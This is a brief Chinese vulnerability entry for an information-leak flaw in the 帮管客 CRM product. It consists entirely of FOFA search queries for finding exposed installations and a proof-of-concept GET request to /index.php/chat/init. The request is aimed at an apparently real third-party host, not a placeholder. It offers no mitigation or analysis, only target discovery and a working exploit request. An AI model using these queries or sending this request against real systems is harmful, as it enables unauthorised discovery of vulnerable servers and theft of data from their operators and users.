# 帮管客 CRM 敏感信息泄露漏洞

    ## fofa

```
(title="用户登录" && body="/themes/default/js/jquery.code.js") || header="Set-Cookie: bgk_session=a%3A5" || body="<p id=\"admintips\" >初始账号：admin" || banner="Set-Cookie: bgk_session=a%3A5"

product="帮管客-CRM"
```

## Poc

```null
GET /index.php/chat/init HTTP/1.1
Host: zrd.houdezg.com:1026
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip


```
